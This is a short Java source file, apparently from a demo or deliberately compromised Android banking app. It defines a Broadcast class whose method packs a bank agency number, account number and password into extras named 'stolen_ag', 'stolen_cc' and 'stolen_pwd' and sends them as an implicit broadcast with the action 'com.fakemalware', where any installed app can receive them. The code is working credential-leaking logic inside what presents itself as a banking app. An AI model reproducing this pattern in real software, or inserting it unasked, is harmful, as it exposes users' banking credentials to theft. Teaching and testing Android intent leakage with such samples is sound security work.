package br.gastecnologia.bancovirtuallite;

import android.app.Activity;
import android.content.Intent;

public class Broadcast {

	private Activity activity;
	
	public Broadcast(Activity activity) {
		this.activity = activity; 
	}
	
	public void sendBradcast(String agency, String account, String password) {
		Intent intent = new Intent();
        intent.setAction("com.fakemalware");
        intent.putExtra("stolen_ag", agency);
        intent.putExtra("stolen_cc", account);
        intent.putExtra("stolen_pwd", password);
        this.activity.sendBroadcast(intent);
	}
	
}
